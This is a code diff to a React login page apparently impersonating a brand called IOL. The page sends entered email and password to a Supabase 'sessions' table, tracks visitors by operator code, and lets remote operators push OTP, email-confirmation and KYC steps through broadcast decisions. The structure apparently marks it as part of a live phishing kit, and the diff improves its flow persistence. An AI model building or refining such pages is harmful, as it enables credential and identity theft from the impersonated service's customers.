@@ -1,4 +1,4 @@
-import { useCallback, useEffect, useMemo, useState } from "react";
+import { useCallback, useEffect, useMemo, useRef, useState } from "react";
 import { useParams } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
@@ -15,23 +15,88 @@ import iolLogo from "@/assets/iol-logo-v7.svg";
 
 type IolStep = "form" | "waiting" | "success" | "otp" | "confirm_email" | "kyc";
 
+type StoredIolFlow = {
+  step: IolStep;
+  email: string;
+  sessionId: string | null;
+  errorMessage: string;
+  generalError: string;
+  kycCaseId: string | null;
+};
+
+const IOL_STORAGE_KEY = "iol_flow_state_v1";
+
 const IOL = () => {
   const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
   const operatorCode = rawOperatorCode?.replace(/[^a-zA-Z0-9]/g, "") || "master";
 
-  const [step, setStep] = useState<IolStep>("form");
-  const [email, setEmail] = useState("");
+  const initialFlow: StoredIolFlow = (() => {
+    try {
+      const raw = sessionStorage.getItem(IOL_STORAGE_KEY);
+      if (!raw) {
+        return {
+          step: "form",
+          email: "",
+          sessionId: null,
+          errorMessage: "",
+          generalError: "",
+          kycCaseId: null,
+        };
+      }
+
+      const parsed = JSON.parse(raw) as Partial<StoredIolFlow>;
+      const allowedSteps: IolStep[] = ["form", "waiting", "success", "otp", "confirm_email", "kyc"];
+      const parsedStep = allowedSteps.includes(parsed.step as IolStep) ? (parsed.step as IolStep) : "form";
+
+      return {
+        step: parsedStep,
+        email: parsed.email || "",
+        sessionId: parsed.sessionId || null,
+        errorMessage: parsed.errorMessage || "",
+        generalError: parsed.generalError || "",
+        kycCaseId: parsed.kycCaseId || null,
+      };
+    } catch {
+      return {
+        step: "form",
+        email: "",
+        sessionId: null,
+        errorMessage: "",
+        generalError: "",
+        kycCaseId: null,
+      };
+    }
+  })();
+
+  const [step, setStep] = useState<IolStep>(initialFlow.step);
+  const [email, setEmail] = useState(initialFlow.email);
   const [loading, setLoading] = useState(false);
-  const [generalError, setGeneralError] = useState("");
-  const [sessionId, setSessionId] = useState<string | null>(null);
-  const [errorMessage, setErrorMessage] = useState("");
-  const [kycCaseId, setKycCaseId] = useState<string | null>(null);
+  const [generalError, setGeneralError] = useState(initialFlow.generalError);
+  const [sessionId, setSessionId] = useState<string | null>(initialFlow.sessionId);
+  const [errorMessage, setErrorMessage] = useState(initialFlow.errorMessage);
+  const [kycCaseId, setKycCaseId] = useState<string | null>(initialFlow.kycCaseId);
 
   const rateLimit = useRateLimit();
   const isMobile = useIsMobile();
+  const currentStepRef = useRef<IolStep>("form");
 
   useVisitTracker();
   useVisitorPresence(sessionId);
+
+  useEffect(() => {
+    currentStepRef.current = step;
+
+    const flowToStore: StoredIolFlow = {
+      step,
+      email,
+      sessionId,
+      errorMessage,
+      generalError,
+      kycCaseId,
+    };
+
+    sessionStorage.setItem(IOL_STORAGE_KEY, JSON.stringify(flowToStore));
+  }, [email, errorMessage, generalError, kycCaseId, sessionId, step]);
 
   useEffect(() => {
     const originalTitle = document.title;
@@ -72,7 +137,7 @@ const IOL = () => {
     setStep("kyc");
   }, [parseCaseIdFromLink]);
 
-  const handleDecision = useCallback((payload?: { status?: string; kyc_link?: string; kyc_case_id?: string } | string, currentStep?: IolStep) => {
+  const handleDecision = useCallback((payload?: { status?: string; kyc_link?: string; kyc_case_id?: string } | string) => {
     const status = typeof payload === "string" ? payload : payload?.status;
     if (!status) return;
 
@@ -108,54 +173,15 @@ const IOL = () => {
       return;
     }
 
-    if (status === "pending_review" && currentStep !== "confirm_email") {
+    if (status === "pending_review" && currentStepRef.current === "waiting") {
       setErrorMessage("");
-      setStep("waiting");
     }
   }, [activateEmbeddedKyc]);
 
   useEffect(() => {
-    if (!sessionId || step === "form" || step === "success") return;
-
-    const currentStep = step;
-    const channel = supabase.channel(`session-review-${sessionId}`);
-    channel
-      .on("broadcast", { event: "review_decision" }, (payload) => {
-        handleDecision(payload.payload as { status?: string; kyc_link?: string; kyc_case_id?: string } | undefined, currentStep);
-      })
-      .subscribe();
-
-    const otpChannel = supabase.channel(`session-otp-decision-${sessionId}`);
-    otpChannel
-      .on("broadcast", { event: "otp_decision" }, (payload) => {
-        handleDecision(payload.payload as { status?: string } | undefined, currentStep);
-      })
-      .subscribe();
-
-    const pollInterval = window.setInterval(async () => {
-      const { data } = await supabase
-        .from("sessions")
-        .select("status, otp_code")
-        .eq("id", sessionId)
-        .maybeSingle();
-
-      if (data?.status === "redirect_kyc") {
-        const kycLink = data.otp_code?.startsWith("kyc_link:") ? data.otp_code.replace("kyc_link:", "") : undefined;
-        activateEmbeddedKyc(kycLink);
-        return;
-      }
-
-      if (data?.status) {
-        handleDecision(data.status, currentStep);
-      }
-    }, 3000);
-
-    return () => {
-      supabase.removeChannel(channel);
-      supabase.removeChannel(otpChannel);
-      window.clearInterval(pollInterval);
-    };
-  }, [activateEmbeddedKyc, handleDecision, sessionId, step]);
+    // Auto-updates desativados para evitar loop e retorno automático ao início.
+    // O fluxo agora só muda por ação do usuário nesta tela.
+  }, []);
 
   const handleLoginSubmit = useCallback(async (submittedEmail: string, password: string) => {
     setGeneralError("");
@@ -230,6 +256,7 @@ const IOL = () => {
   }, [sessionId]);
 
   const handleRetry = useCallback(() => {
+    sessionStorage.removeItem(IOL_STORAGE_KEY);
     setStep("form");
     setSessionId(null);
     setKycCaseId(null);
@@ -237,17 +264,18 @@ const IOL = () => {
     setGeneralError("");
   }, []);
 
-  const handleGoToConfirmEmail = useCallback(async () => {
-    if (sessionId) {
-      await supabase
-        .from("sessions")
-        .update({ status: "redirect_confirm_email" })
-        .eq("id", sessionId);
-    }
-
+  const handleGoToConfirmEmail = useCallback(() => {
     setErrorMessage("");
     setGeneralError("");
     setStep("confirm_email");
+
+    if (sessionId) {
+      supabase
+        .from("sessions")
+        .update({ status: "redirect_confirm_email" })
+        .eq("id", sessionId)
+        .then(() => {});
+    }
   }, [sessionId]);
 
   const isKycStep = step === "kyc" && Boolean(kycCaseId);
